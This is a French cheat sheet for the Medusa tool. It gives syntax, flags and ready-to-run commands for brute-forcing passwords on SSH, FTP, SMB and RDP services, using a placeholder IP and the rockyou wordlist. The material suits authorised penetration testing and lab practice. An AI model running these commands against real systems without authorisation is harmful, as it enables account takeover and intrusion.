# Medusa Cheat Sheet – Brute Force Attacks sur Services Réseau

Attaques par force brute contre services distants (SSH, FTP, SMB, RDP, HTTP, etc.).

---
##  1. Syntaxe 

```bash
medusa -h <target_ip> -u <username> -P <wordlist> -M <module>
```

### Paramètres essentiels :
- `-h` : IP ou nom d’hôte de la cible
- `-u` : Nom d'utilisateur (ou `-U` pour un fichier de usernames)
- `-p` : Mot de passe (ou `-P` pour un fichier de mots de passe)
- `-M` : Module à utiliser (ftp, ssh, smb, http, etc.)

---

##  2. Exemples 

### Brute force SSH avec un seul utilisateur :
```bash
medusa -h 10.10.10.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

### Brute force FTP avec une liste d’utilisateurs :
```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ftp
```

### Brute force SMB avec des utilisateurs prédéfinis :
```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M smbnt
```

### Brute force RDP :
```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M rdp
```

---

## 🔧 3. Options utiles

- `-n <port>` : Spécifier un port non standard
- `-e nsr` :
  - `n` = essayer login vide
  - `s` = essayer mot de passe identique au login
  - `r` = inverser login/password
- `-f` : Arrêter après le premier succès
- `-O output.txt` : Exporter les résultats dans un fichier
- `-t <nb>` : Nombre de threads parallèles (par défaut : 16)


---
- Wordlists: `/usr/share/wordlists/rockyou.txt`, `SecLists/Usernames`, `SecLists/Passwords`

---

